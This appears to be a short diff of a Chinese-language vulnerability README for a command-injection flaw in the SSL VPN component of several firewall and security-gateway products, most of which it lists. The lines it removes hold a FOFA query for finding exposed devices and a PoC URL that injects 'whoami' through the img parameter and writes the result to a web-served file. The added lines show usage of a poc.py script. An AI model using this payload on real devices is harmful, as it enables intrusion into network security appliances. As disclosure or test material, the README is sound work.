@@ -1,5 +1,4 @@
-```
-fofa：body="/webui/images/default/default/alert_close.jpg"
+
 受影响产品
 	H3C-下一代防火墙
 	安恒信息-明御安全网关
@@ -15,6 +14,5 @@ fofa：body="/webui/images/default/default/alert_close.jpg"
 	任子行网络安全审计系统
 	绿盟安全审计系统
 	深圳市鑫塔科技有限公司第二代防火墙
-POC：/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls
-```
-
+ 用法 python poc.py -t url
+      python poc.py -f 文件名
